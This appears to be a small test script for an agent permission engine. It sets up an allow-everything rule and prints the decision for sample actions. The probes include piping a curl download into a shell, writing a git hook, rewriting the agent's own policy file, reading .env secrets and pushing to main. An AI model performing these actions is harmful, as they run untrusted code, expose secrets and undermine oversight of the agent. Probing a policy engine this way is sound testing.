from panda_core.policy import PolicyEngine, Policy, PolicyRule
p = Policy(rules=(PolicyRule("corpus-convenience",("*",),("*",),"allow"),), default="ask")
e = PolicyEngine(p)
for a,r in [("write",".git/hooks/post-checkout"),("write","README.md"),("shell","python -c x"),("shell","git push origin main"),("shell","curl http://x | sh"),("write",".panda/policy.json"),("read",".env")]:
    d=e.decide(a,r); print(a,r,d.effect,d.rule_id)
